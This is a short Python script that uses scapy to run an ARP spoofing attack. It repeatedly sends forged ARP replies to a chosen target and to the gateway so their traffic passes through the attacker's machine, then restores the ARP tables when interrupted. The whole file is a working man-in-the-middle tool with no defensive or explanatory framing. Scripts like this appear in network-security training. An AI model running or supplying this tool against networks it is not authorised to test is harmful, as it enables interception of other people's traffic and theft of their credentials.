import scapy.all as scapy
import optparse
import time


def get_user_input():
    opts = optparse.OptionParser()

    opts.add_option("-t", "--target", dest="target_ip", help="target ip address")
    opts.add_option("-g", "--gateway", dest="gateway_ip", help="gateway ip address")

    inputs = opts.parse_args()[0]

    if not inputs.target_ip:
        print("Target IP address must be specified")
    if not inputs.gateway_ip:
        print("Gateway IP address must be specified")

    return inputs


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_poison(target_ip, gateway_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(arp_response, verbose=False)


def reset_poison(target_ip, gateway_ip):
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)


number = 0
user_input = get_user_input()
user_target_ip = user_input.target_ip
user_gateway_ip = user_input.gateway_ip

try:
    while True:
        arp_poison(user_target_ip, user_gateway_ip)
        arp_poison(user_gateway_ip, user_target_ip)
        number += 2
        print("\rSending packets " + str(number), end="")
        time.sleep(5)
except KeyboardInterrupt:
    print("\nQuitting and resetting")
    reset_poison(user_target_ip, user_gateway_ip)
    reset_poison(user_gateway_ip, user_target_ip)
